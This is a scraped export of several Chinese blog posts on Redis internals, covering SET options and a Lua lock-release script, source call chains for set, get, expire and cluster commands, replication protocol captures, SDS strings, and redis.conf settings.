127.0.0.1:6379&gt; EXISTS testxxkey(integer) 0redis 127.0.0.1:6379&gt; SET testxxkey &quot;value&quot; XX(nil) # 因为键不存在，设置失败redis 127.0.0.1:6379&gt; SET testxxkey &quot;value&quot;OK # 先给键设置一个值redis 127.0.0.1:6379&gt; SET testxxkey &quot;new-value&quot; XXOK # 设置新值成功redis 127.0.0.1:6379&gt; GET testxxkey&quot;new-value&quot; NX 或 XX 可以和 EX 或者 PX 组合使用1234567891011121314151617181920redis 127.0.0.1:6379&gt; SET testexxxkey &quot;hello&quot; EX 10086 NXOKredis 127.0.0.1:6379&gt; GET testexxxkey&quot;hello&quot;redis 127.0.0.1:6379&gt; TTL testexxxkey(integer) 10063redis 127.0.0.1:6379&gt; SET testexxxkey &quot;old value&quot;OKredis 127.0.0.1:6379&gt; SET testexxxkey &quot;new value&quot; PX 123321OKredis 127.0.0.1:6379&gt; GET testexxxkey&quot;new value&quot;redis 127.0.0.1:6379&gt; PTTL testexxxkey(integer) 112999 EX 和 PX 可以同时出现，但后面给出的选项会覆盖前面给出的选项12345678910111213redis 127.0.0.1:6379&gt; SET key &quot;value&quot; EX 1000 PX 5000000OKredis 127.0.0.1:6379&gt; TTL key(integer) 4993 # 这是 PX 参数设置的值redis 127.0.0.1:6379&gt; SET another-key &quot;value&quot; PX 5000000 EX 1000OKredis 127.0.0.1:6379&gt; TTL another-key(integer) 997 # 这是 EX 参数设置的值使用模式命令 SET resource-name anystring NX EX max-lock-time 是一种在 Redis 中实现锁的简单方法。 客户端执行以上的命令： 1234567如果服务器返回 OK ，那么这个客户端获得锁。如果服务器返回 NIL ，那么客户端获取锁失败，可以在稍后再重试。设置的过期时间到达之后，锁将自动释放。可以通过以下修改，让这个锁实现更健壮：不使用固定的字符串作为键的值，而是设置一个不可猜测（non-guessable）的长随机字符串，作为口令串（token）。不使用 DEL 命令来释放锁，而是发送一个 Lua 脚本，这个脚本只在客户端传入的值和键的口令串相匹配时，才对键进行删除。这两个改动可以防止持有过期锁的客户端误删现有锁的情况出现。 以下是一个简单的解锁脚本示例： 12345if redis.call(&quot;get&quot;,KEYS[1]) == ARGV[1] then return redis.call(&quot;del&quot;,KEYS[1])else return 0end 这个脚本可以通过 EVAL …script… 1 resource-name token-value 命令来调用。 源码分析 流程调用以redis5.0版本为例，set command流程）如下： 12345678910111213141516171819202122232425262728293031323334start 0x00007fff6957ecc9main server.c:4437 //传入server调用事件aeMain ae.c:501 //处理网络事件aeProcessEvents ae.c:443 //数据转发readQueryFromClient networking.c:1583 // processInputBufferAndReplicate networking.c:1501 //任务分发processInputBuffer networking.c:1466 //调用processCommandprocessCommand server.c:2785 //处理特殊命令，命令分类及执行方式，如是否要加入队列 //getNodeByQuery(获取节点与当前节点对比,判断该节点是否存储该数据，存在执行正常流程，不存在通过 clusterRedirectClient函数返回客户端 //包含key不存在，节点挂了，已经迁移等情况call server.c:2478 //进行计时调用，c-&gt;cmd-&gt;proc(c);分发执行调用setCommand， //慢查询日志记录，只记录大于配置时间的setCommand t_string.c:139 //调用setGenericCommand【数据类型】setGenericCommand t_string.c:86 //调用setKey【数据类型】setKey db.c:218 //决定为dbadd or dboverwrite，计数器自增，删除过期key，key通知dbAdd db.c:175 //调用dictAdd，处理集群slotToKeyAdddictAdd dict.c:267 //代码较为简单，调用dictAddRaw，设置valdictAddRaw dict.c:317 //处理渐进hash,获取索引,选用ht,存储ht-&gt;table","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"redis-expire调用链","slug":"data/redis/command/expire调用链","date":"2022-04-07T01:21:38.761Z","updated":"2022-04-07T01:21:38.761Z","comments":true,"path":"2022/04/07/data/redis/command/expire调用链/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/command/expire%E8%B0%83%E7%94%A8%E9%93%BE/","excerpt":"","text":"redisDb结构123456789101112131415/* Redis database representation. There are multiple databases identified* by integers from 0 (the default database) up to the max configured* database. The database number is the &#x27;id&#x27; field in the structure. */typedef struct redisDb &#123; dict *dict; /* The keyspace for this DB */ dict *expires; /* Timeout of keys with a timeout set */ dict *blocking_keys; /* Keys with clients waiting for data (BLPOP)*/ dict *ready_keys; /* Blocked keys that received a PUSH */ dict *watched_keys; /* WATCHED keys for MULTI/EXEC CAS */ int id; /* Database ID */ long long avg_ttl; /* Average TTL, just for stats */ list *defrag_later; /* List of key names to attempt to defrag one by one, gradually. */ &#125; redisDb; dict.expires 只存储过期key set (key value ex) 调用流程redisDb.expires存储过期key 123456789101112setExpire db.c:1082setGenericCommand t_string.c:88setCommand t_string.c:139call server.c:2478processCommand server.c:2785processInputBuffer networking.c:1466processInputBufferAndReplicate networking.c:1501readQueryFromClient networking.c:1583aeProcessEvents ae.c:443aeMain ae.c:501main server.c:4437start 0x00007fff666bc3d5 setex (testexkey 1000 111) 调用流程123456789101112setExpire db.c:1082setGenericCommand t_string.c:88setexCommand t_string.c:149call server.c:2478processCommand server.c:2785processInputBuffer networking.c:1466processInputBufferAndReplicate networking.c:1501readQueryFromClient networking.c:1583aeProcessEvents ae.c:443aeMain ae.c:501main server.c:4437start 0x00007fff666bc3d5 expire (testexkey 1000) 调用流程123456789101112setExpire db.c:1080expireGenericCommand expire.c:447expireCommand expire.c:458call server.c:2478processCommand server.c:2785processInputBuffer networking.c:1466processInputBufferAndReplicate networking.c:1501readQueryFromClient networking.c:1583aeProcessEvents ae.c:443aeMain ae.c:501main server.c:4437start 0x00007fff666bc3d5","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"redis-cluster调用链","slug":"data/redis/command/cluster调用链","date":"2022-04-07T01:21:38.761Z","updated":"2022-04-07T01:21:38.761Z","comments":true,"path":"2022/04/07/data/redis/command/cluster调用链/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/command/cluster%E8%B0%83%E7%94%A8%E9%93%BE/","excerpt":"","text":"1.cluster命令 命令 描述 示例 备注 CLUSTER HELP 支持命令及描述 CLUSTER HELP CLUSTER ADDSLOTS 为当前节点分配槽位 CLUSTER ADDSLOTS 0 5 CLUSTER BUMPEPOCH 推进集群配置纪元 CLUSTER BUMPEPOCH CLUSTER COUNT-failure-reports 返回的失败报告数量 CLUSTER COUNT-failure-reports node-id CLUSTER COUNTKEYSINSLOT 返回&lt;槽位&gt;中的键数 CLUSTER COUNTKEYSINSLOT 1 CLUSTER DELSLOTS 删除当前节点的槽位信息 CLUSTER DELSLOTS 2 5 CLUSTER FAILOVER 集群故障转移 CLUSTER FAILOVER CLUSTER FORGET 删除节点 CLUSTER FORGET node-id CLUSTER GETKEYSINSLOT 返回当前节点存储在slot中的键名 CLUSTER GETKEYSINSLOT 1000 3 CLUSTER FLUSHSLOTS 删除当前节点自己的槽位信息 CLUSTER FLUSHSLOTS CLUSTER INFO 返回集群信息 CLUSTER INFO CLUSTER KEYSLOT 返回的哈希槽 CLUSTER KEYSLOT 1 CLUSTER MEET 将节点连接到一个工作集群 CLUSTER MEET 10.3.4.111 7001 CLUSTER MYID 返回当前节点ID CLUSTER MYID CLUSTER NODES 返回集群节点信息 CLUSTER NODES CLUSTER REPLICATE 将当前节点配置为副本 CLUSTER REPLICATE node-id CLUSTER RESET 重置当前节点 CLUSTER RESET CLUSTER SETSLOT 修改接受节点中哈希槽的状态 CLUSTER SETSLOT 1 MIGRATING node-id CLUSTER REPLICAS 返回节点REPLICAS CLUSTER REPLICAS node-id CLUSTER SET-CONFIG-EPOCH 修改接受节点中哈希槽的状态 CLUSTER SET-CONFIG-EPOCH 1 CLUSTER SLOTS 返回节点槽位 CLUSTER SLOTS 1234567891011121314151617181920212223 1) CLUSTER &lt;subcommand&gt; arg arg ... arg. Subcommands are: 2) ADDSLOTS &lt;slot&gt; [slot ...] -- Assign slots to current node. 3) BUMPEPOCH -- Advance the cluster config epoch. 4) COUNT-failure-reports &lt;node-id&gt; -- Return number of failure reports for &lt;node-id&gt;. 5) COUNTKEYSINSLOT &lt;slot&gt; - Return the number of keys in &lt;slot&gt;. 6) DELSLOTS &lt;slot&gt; [slot ...] -- Delete slots information from current node. 7) FAILOVER [force|takeover] -- Promote current replica node to being a master. 8) FORGET &lt;node-id&gt; -- Remove a node from the cluster. 9) GETKEYSINSLOT &lt;slot&gt; &lt;count&gt; -- Return key names stored by current node in a slot.10) FLUSHSLOTS -- Delete current node own slots information.11) INFO - Return onformation about the cluster.12) KEYSLOT &lt;key&gt; -- Return the hash slot for &lt;key&gt;.13) MEET &lt;ip&gt; &lt;port&gt; [bus-port] -- Connect nodes into a working cluster.14) MYID -- Return the node id.15) NODES -- Return cluster configuration seen by node. Output format:16) &lt;id&gt; &lt;ip:port&gt; &lt;flags&gt; &lt;master&gt; &lt;pings&gt; &lt;pongs&gt; &lt;epoch&gt; &lt;link&gt; &lt;slot&gt; ... &lt;slot&gt;17) REPLICATE &lt;node-id&gt; -- Configure current node as replica to &lt;node-id&gt;.18) RESET [hard|soft] -- Reset current node (default: soft).19) SET-config-epoch &lt;epoch&gt; - Set config epoch of current node.20) SETSLOT &lt;slot&gt; (importing|migrating|stable|node &lt;node-id&gt;) -- Set slot state.21) REPLICAS &lt;node-id&gt; -- Return &lt;node-id&gt; replicas.22) SLOTS -- Return information about slots range mappings. Each range is made of:23) start, end, master and replicas IP addresses, ports and ids 详细参考：http://doc.redisfans.com/ 2.cluster命令解析2.1.cluster info123456789101112clusterGenNodesDescription cluster.c:4122clusterCommand cluster.c:4305call server.c:2478processCommand server.c:2785processInputBuffer networking.c:1466processInputBufferAndReplicate networking.c:1501readQueryFromClient networking.c:1583aeProcessEvents ae.c:443aeMain ae.c:501main server.c:4437start 0x00007fff63f8e3d5 附录:主要函数列表123456789101112131415161718192021222324252627282930clusterNode *createClusterNode(char *nodename, int flags);int clusterAddNode(clusterNode *node);void clusterAcceptHandler(aeEventLoop *el, int fd, void *privdata, int mask);void clusterReadHandler(aeEventLoop *el, int fd, void *privdata, int mask);void clusterSendPing(clusterLink *link, int type);void clusterSendFail(char *nodename);void clusterSendFailoverAuthIfNeeded(clusterNode *node, clusterMsg *request);void clusterUpdateState(void);int clusterNodeGetSlotBit(clusterNode *n, int slot);sds clusterGenNodesDescription(int filter);clusterNode *clusterLookupNode(const char *name);int clusterNodeAddSlave(clusterNode *master, clusterNode *slave);int clusterAddSlot(clusterNode *n, int slot);int clusterDelSlot(int slot);int clusterDelNodeSlots(clusterNode *node);int clusterNodeSetSlotBit(clusterNode *n, int slot);void clusterSetMaster(clusterNode *n);void clusterHandleSlaveFailover(void);void clusterHandleSlaveMigration(int max_slaves);int bitmapTestBit(unsigned char *bitmap, int pos);void clusterDoBeforeSleep(int flags);void clusterSendUpdate(clusterLink *link, clusterNode *node);void resetManualFailover(void);void clusterCloseAllSlots(void);void clusterSetNodeAsMaster(clusterNode *n);void clusterDelNode(clusterNode *delnode);sds representClusterNodeFlags(sds ci, uint16_t flags);uint64_t clusterGetMaxEpoch(void);int clusterBumpConfigEpochWithoutConsensus(void);void moduleCallClusterReceivers(const char *sender_id, uint64_t module_id, uint8_t type, const unsigned char *payload, uint32_t len);","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"2.3.redis-写数据流程概述","slug":"data/redis/code/2.3.写数据流程概述","date":"2022-04-07T01:21:38.760Z","updated":"2022-04-07T01:21:38.760Z","comments":true,"path":"2022/04/07/data/redis/code/2.3.写数据流程概述/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/2.3.%E5%86%99%E6%95%B0%E6%8D%AE%E6%B5%81%E7%A8%8B%E6%A6%82%E8%BF%B0/","excerpt":"","text":"set command流程概述 流程调用以redis5.0版本为例，set command流程（倒序调用debug偷懒）如下： 123456789101112131415161718192021222324252627282930dictAddRaw dict.c:317 //处理渐进hash,获取索引,选用ht,存储ht-&gt;tabledictAdd dict.c:267 //代码较为简单，调用dictAddRaw，设置valdbAdd db.c:175 //调用dictAdd，处理集群slotToKeyAddsetKey db.c:218 //决定为dbadd or dboverwrite，计数器自增，删除过期key，key通知setGenericCommand t_string.c:86 //调用setKey【数据类型】setCommand t_string.c:139 //调用setGenericCommand【数据类型】call server.c:2478 //进行计时调用，c-&gt;cmd-&gt;proc(c);分发执行调用setCommand，进行慢查询日志记录，只记录大于配置时间的processCommand server.c:2785 //处理特殊命令，命令分类及执行方式，如是否要加入队列processInputBuffer networking.c:1466 //调用processCommandprocessInputBufferAndReplicate networking.c:1501 //任务分发readQueryFromClient networking.c:1583 //aeProcessEvents ae.c:443 //数据转发aeMain ae.c:501 //处理网络事件main server.c:4437 //传入server调用事件start 0x00007fff6957ecc9 hset流程12345678910111213141516dictAddRaw dict.c:298dictAdd dict.c:267dbAdd db.c:175hashTypeLookupWriteOrCreate t_hash.c:455hsetnxCommand t_hash.c:516call server.c:2478 //信令查询进行分发processCommand server.c:2785processInputBuffer networking.c:1466processInputBufferAndReplicate networking.c:1501readQueryFromClient networking.c:1583aeProcessEvents ae.c:443aeMain ae.c:501main server.c:4437start 0x00007fff6957ecc9","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"2.5.redis-主从流程","slug":"data/redis/code/2.5.主从流程","date":"2022-04-07T01:21:38.760Z","updated":"2022-04-07T01:21:38.760Z","comments":true,"path":"2022/04/07/data/redis/code/2.5.主从流程/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/2.5.%E4%B8%BB%E4%BB%8E%E6%B5%81%E7%A8%8B/","excerpt":"","text":"1.主从同步流程1.1.保活 请求123*1$4PING 应答1+PONG 1.2.上报监听端口 请求1234567*3$8REPLCONF$14listening-port$549314 应答1+OK 1.3.上报地址 请求1234567*3$8REPLCONF$10ip-address$9127.0.0.1 应答1+OK 1.4.上报信息 请求1234567*3$8REPLCONF$4capa$3eof 应答1+OK 1.55.上报类型 请求1234567*3$8REPLCONF$4capa$6psync2 应答1+OK 1.6.上报同步时间戳 请求 1234567*3$5PSYNC$1?$3218 应答(全量) 123456+FULLRESYNC 02e371bd4a31c072e356c2cb0446f7d42ef0ff38 4060$227REDIS0009. redis-ver.5.0.12.redis-bits.@..ctime.BE.`..used-mem. .....repl-stream-db....repl-id(02e371bd4a31c072e356c2cb0446f7d42ef0ff38..repl-offset.....aof-preamble..... .................. . ........................O..5.P.. 应答(增量) 1234567PSYNC$4049adee2ad3c3bc3a23a812ddbb2403725079718b$44229+CONTINUE 1.7.上报信息同步索引 请求123456789101112131415161718192021*3$8REPLCONF$3ACK$44060*3$8REPLCONF$3ACK$44060*3$8REPLCONF$3ACK$44060 123456789101112131415REPLCONF$3ACK$45960*3$8REPLCONF$3ACK$45960*1$4PING 1processEvent,repl: 49adee2ad3c3bc3a23a812ddbb2403725079718b, offset: 5960 2.附录2.1 同步报文123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138*1$4PING+PONG*3$8REPLCONF$14listening-port$559804+OK*3$8REPLCONF$10ip-address$9127.0.0.1+OK*3$8REPLCONF$4capa$3eof+OK*3$8REPLCONF$4capa$6psync2+OK*3$5PSYNC$1?$2-2+FULLRESYNC db72e13d181ffb0d9cc7384c175a2371a530248b 1$138REDIS0007. redis-ver.3.2.12.redis-bits.@..ctime.Y.za..used-mem............a.a.......keya.valuea..keyb.valueb.....................y.&quot;.W^..*3$8REPLCONF$3ACK$11*3$8REPLCONF$3ACK$11*3$8REPLCONF$3ACK$11*3$8REPLCONF$3ACK$11*1$4PING*3$8REPLCONF$3ACK$215*3$8REPLCONF$3ACK$215*1$4PING*3$8REPLCONF$3ACK$229*2$6SELECT$10*3$3set$4keyc$6valuec*3$8REPLCONF$3ACK$287*3$8REPLCONF$3ACK$287 2.2 同步空包1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283*1$4PING+PONG*3$8REPLCONF$14listening-port$549942+OK*3$8REPLCONF$10ip-address$9127.0.0.1+OK*3$8REPLCONF$4capa$3eof+OK*3$8REPLCONF$4capa$6psync2+OK*3$5PSYNC$40db72e13d181ffb0d9cc7384c175a2371a530248b$11+FULLRESYNC 49adee2ad3c3bc3a23a812ddbb2403725079718b 1$77REDIS0007. redis-ver.3.2.12.redis-bits.@..ctime....a..used-mem.............*3$8REPLCONF$3ACK$11*3$8REPLCONF$3ACK$11*3$8REPLCONF$3ACK$11*3$8REPLCONF$3ACK$11*3$8REPLCONF$3ACK$11 2.3 同步增量123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195*1$4PING+PONG*3$8REPLCONF$14listening-port$550731+OK*3$8REPLCONF$10ip-address$9127.0.0.1+OK*3$8REPLCONF$4capa$3eof+OK*3$8REPLCONF$4capa$6psync2+OK*3$5PSYNC$4049adee2ad3c3bc3a23a812ddbb2403725079718b$44229+CONTINUE*1$4PING*3$8REPLCONF$3ACK$44242*1$4PING*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*3$8REPLCONF$3ACK$44256*1$4PING*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270*3$8REPLCONF$3ACK$44270","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"2.4.redis-读数据流程概述","slug":"data/redis/code/2.4.读数据流程概述","date":"2022-04-07T01:21:38.760Z","updated":"2022-04-07T01:21:38.760Z","comments":true,"path":"2022/04/07/data/redis/code/2.4.读数据流程概述/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/2.4.%E8%AF%BB%E6%95%B0%E6%8D%AE%E6%B5%81%E7%A8%8B%E6%A6%82%E8%BF%B0/","excerpt":"","text":"get command流程概述 流程调用以redis5.0版本为例，set command流程如下： 1234567891011121314151617dictFind dict.c:483lookupKey db.c:56lookupKeyReadWithFlags db.c:133lookupKeyRead db.c:144lookupKeyReadOrReply db.c:158getGenericCommand t_string.c:160getCommand t_string.c:173call server.c:2478processCommand server.c:2785processInputBuffer networking.c:1466processInputBufferAndReplicate networking.c:1501readQueryFromClient networking.c:1583aeProcessEvents ae.c:443aeMain ae.c:501main server.c:4437start 0x00007fff6957ecc9","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"2.6.redis-cluster流程","slug":"data/redis/code/2.6.cluster流程","date":"2022-04-07T01:21:38.760Z","updated":"2022-04-07T01:21:38.760Z","comments":true,"path":"2022/04/07/data/redis/code/2.6.cluster流程/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/2.6.cluster%E6%B5%81%E7%A8%8B/","excerpt":"","text":"1.cluster基础信息1.1.cluster info12345*2$7cluster$4info 123456789101112$267cluster_state:okcluster_slots_assigned:16384cluster_slots_ok:16384cluster_slots_pfail:0cluster_slots_fail:0cluster_known_nodes:1cluster_size:1cluster_current_epoch:1cluster_my_epoch:1cluster_stats_messages_sent:0cluster_stats_messages_received:0 1.2.cluster nodes12345*2$7cluster$5nodes 12$102184833235217c242457768709178276ee67b1852 127.0.0.1:7005@17005 myself,master - 0 0 1 connected 0-16383 1.3.cluster help12345*2$7cluster$4help 123456789101112131415161718192021222324*23+CLUSTER &lt;subcommand&gt; arg arg ... arg. Subcommands are:+ADDSLOTS &lt;slot&gt; [slot ...] -- Assign slots to current node.+BUMPEPOCH -- Advance the cluster config epoch.+COUNT-failure-reports &lt;node-id&gt; -- Return number of failure reports for &lt;node-id&gt;.+COUNTKEYSINSLOT &lt;slot&gt; - Return the number of keys in &lt;slot&gt;.+DELSLOTS &lt;slot&gt; [slot ...] -- Delete slots information from current node.+FAILOVER [force|takeover] -- Promote current replica node to being a master.+FORGET &lt;node-id&gt; -- Remove a node from the cluster.+GETKEYSINSLOT &lt;slot&gt; &lt;count&gt; -- Return key names stored by current node in a slot.+FLUSHSLOTS -- Delete current node own slots information.+INFO - Return onformation about the cluster.+KEYSLOT &lt;key&gt; -- Return the hash slot for &lt;key&gt;.+MEET &lt;ip&gt; &lt;port&gt; [bus-port] -- Connect nodes into a working cluster.+MYID -- Return the node id.+NODES -- Return cluster configuration seen by node. Output format:+ &lt;id&gt; &lt;ip:port&gt; &lt;flags&gt; &lt;master&gt; &lt;pings&gt; &lt;pongs&gt; &lt;epoch&gt; &lt;link&gt; &lt;slot&gt; ... &lt;slot&gt;+REPLICATE &lt;node-id&gt; -- Configure current node as replica to &lt;node-id&gt;.+RESET [hard|soft] -- Reset current node (default: soft).+SET-config-epoch &lt;epoch&gt; - Set config epoch of current node.+SETSLOT &lt;slot&gt; (importing|migrating|stable|node &lt;node-id&gt;) -- Set slot state.+REPLICAS &lt;node-id&gt; -- Return &lt;node-id&gt; replicas.+SLOTS -- Return information about slots range mappings. Each range is made of:+ start, end, master and replicas IP addresses, ports and ids 1.4.cluster myid12345*2$7cluster$4myid 12$40184833235217c242457768709178276ee67b1852","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"2.2.1.redis-字符串","slug":"data/redis/code/2.2.1.字符串","date":"2022-04-07T01:21:38.759Z","updated":"2022-04-07T01:21:38.759Z","comments":true,"path":"2022/04/07/data/redis/code/2.2.1.字符串/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/2.2.1.%E5%AD%97%E7%AC%A6%E4%B8%B2/","excerpt":"","text":"字符串（sds.h/sds.c）Redis只会使用C字符串作为字面量,在大多数情况下，Redis使用SDS(Simple Dynamic String,简单动态字符串)作为字符串表示。 1.SDS优点比起C字符串,SDS具有以下优点： 常数复杂度获取字符串长度。 杜绝缓冲区溢出。 减少修改字符串长度时所需的内存重分配次数。 二进制安全。 兼容部分C字符串函数。 2.备注123456struct __attribute__ ((__packed__)) sdshdr64 &#123; uint64_t len; /* used */ uint64_t alloc; /* excluding the header and null terminator */ unsigned char flags; /* 3 lsb of type, 5 unused bits */ char buf[];&#125;; 1234567891011121314151617181920212223242526272829303132333435363738394041424344sdsHdrSizesdsReqTypesdsnewlensdsemptysdsnewsdsdupsdsfreesdsupdatelensdsclearsdsMakeRoomForsdsRemoveFreeSpacesdsAllocSizesdsAllocPtrsdsIncrLensdsgrowzerosdscatlensdscatsdscatsdssdscpylensdscpySDS_LLSTR_SIZEsdsll2strsdsull2strsdsfromlonglongsdscatvprintfsdscatprintfsdscatfmtsdstrimsdsrangesdstolowersdstouppersdscmpsdssplitlensdsfreesplitressdscatrepris_hex_digithex_digit_to_intsdssplitargssdsmapcharssdsjoinsdsjoinsdssds_mallocsds_reallocsds_free","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"2.2.2.redis-zset流程","slug":"data/redis/code/2.2.2.zset流程","date":"2022-04-07T01:21:38.759Z","updated":"2022-04-07T01:21:38.760Z","comments":true,"path":"2022/04/07/data/redis/code/2.2.2.zset流程/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/2.2.2.zset%E6%B5%81%E7%A8%8B/","excerpt":"","text":"1.zset信令1.2. zadd zrange123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137*6$4zadd$8testzset$12$3two$13$5three:2*6$4zadd$8testzset$14$4two1$15$6three1:2*4$6zrange$8testzset$10$10*1$3two*4$6zrange$8testzset$10$11*2$3two$5three*4$6zrange$8testzset$10$12*3$3two$5three$4two1*4$6zrange$8testzset$10$13*4$3two$5three$4two1$6three1*4$6zrange$8testzset$10$2-1*4$3two$5three$4two1$6three1*4$6zrange$8testzset$10$2-4*1$3two*4$6zrange$8testzset$10$2-5*0 1.2 zrange withscores123456789101112131415161718192021222324*5$6zrange$512345$10$12$10withscores*6$2m2$12$2m3$13$3me4$14 123456789101112131415161718REPLCONF$3ACK$44755*3$3set$12$12*3$8REPLCONF$3ACK$4","categories":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/categories/redis/"}],"tags":[{"name":"redis","slug":"redis","permalink":"https://wuhaocn.github.io/tags/redis/"}]},{"title":"1.5.redis-配置文件详解","slug":"data/redis/code/1.5.redis配置文件详解","date":"2022-04-07T01:21:38.758Z","updated":"2022-04-07T01:21:38.758Z","comments":true,"path":"2022/04/07/data/redis/code/1.5.redis配置文件详解/","link":"","permalink":"https://wuhaocn.github.io/2022/04/07/data/redis/code/1.5.redis%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"redis的配置文件介绍1.配置文件概要1、开头说明2、INCLUDES3、MODULES4、NETWORK5、GENERAL6、SNAPSHOTTING7、REPLICATION8、SECURITY9、CLIENTS10、MEMORY MANAGEMENT11、APPEND ONLY MODE12、LUA SCRIPTING13、REDIS CLUSTER 2.模块说明2.1 开头说明这里没什么好说的，需要注意的是后面需要使用内存大小时，可以指定单位，通常是以 k,gb,m的形式出现，并且单位不区分大小写。 2.2 INCLUDES我们知道Redis只有一个配置文件，如果多个人进行开发维护，那么就需要多个这样的配置文件，这时候多个配置文件就可以在此通过 include /path/to/local.conf 配置进来，而原本的 redis.conf 配置文件就作为一个总闸。 ps:如果用过struts2 开发的同学，在项目组中多人开发的情况下，通常会有多个struts2.xml 文件，这时候也会通过类时的配置引入进来。 另外需要注意的时，如果将此配置写在redis.conf 文件的开头，那么后面的配置会覆盖引入文件的配置，如果想以引入文件的配置为主，那么需要将 include 配置写在 redis.conf 文件的末尾。 2.3 MODULESredis3.0的爆炸功能是新增了集群，而redis4.0就是在3.0的基础上新增了许多功能，其中这里的 自定义模块配置就是其中之一。通过这里的 loadmodule 配置将引入自定义模块来新增一些功能。 2.4 NETWORKps:这里的配置较长，我只截取了一部分，下同。 ①、bind:绑定redis服务器网卡IP，默认为127.0.0.1,即本地回环地址。 这样的话，访问redis服务只能通过本机的客户端连接，而无法通过远程连接。如果bind选项为空的话，那会接受所有来自于可用网络接口的连接。 ②、port：指定redis运行的端口，默认是6379。由于Redis是单线程模型，因此单机开多个Redis进程的时候会修改端口。 ③、timeout：设置客户端连接时的超时时间，单位为秒。当客户端在这段时间内没有发出任何指令，那么关闭该连接。默认值为0，表示不关闭。 ④、tcp-keepalive ：单位是秒，表示将周期性的使用SO_KEEPALIVE检测客户端是否还处于健康状态，避免服务器一直阻塞， 官方给出的建议值是300s，如果设置为0，则不会周期性的检测。 2.5、GENERAL具体配置详解： ①、daemonize:设置为yes表示指定Redis以守护进程的方式启动（后台启动）。默认值为 no ②、pidfile:配置PID文件路径，当redis作为守护进程运行的时候，它会把 pid 默认写到 /var/redis/run/redis_6379.pid 文件里面 ③、loglevel ：定义日志级别。默认值为notice，有如下4种取值： debug（记录大量日志信息，适用于开发、测试阶段） verbose（较多日志信息） notice（适量日志信息，使用于生产环境） warning（仅有部分重要、关键信息才会被记录） ④、logfile ：配置log文件地址,默认打印在命令行终端的窗口上 ⑤、databases：设置数据库的数目。默认的数据库是DB 0 ，可以在每个连接上使用select 命令选择一个不同的数据库， dbid是一个介于0到databases - 1 之间的数值。默认值是 16，也就是说默认Redis有16个数据库。 2.6、SNAPSHOTTING这里的配置主要用来做持久化操作。 ①、save：这里是用来配置触发 Redis的持久化条件，也就是什么时候将内存中的数据保存到硬盘。默认如下配置： save 900 1：表示900 秒内如果至少有 1 个 key 的值变化，则保存 save 300 10：表示300 秒内如果至少有 10 个 key 的值变化，则保存 save 60 10000：表示60 秒内如果至少有 10000 个 key 的值变化，则保存 当然如果你只是用Redis的缓存功能，不需要持久化，那么你可以注释掉所有的 save 行来停用保存功能。可以直接一个空字符串来实现停用：save &quot;&quot; ②、stop-writes-on-bgsave-error ：默认值为yes。当启用了RDB且最后一次后台保存数据失败，Redis是否停止接收数据。 这会让用户意识到数据没有正确持久化到磁盘上，否则没有人会注意到灾难（disaster）发生了。如果Redis重启了，那么又可以重新开始接收数据了 ③、rdbcompression ；默认值是yes。对于存储到磁盘中的快照，可以设置是否进行压缩存储。 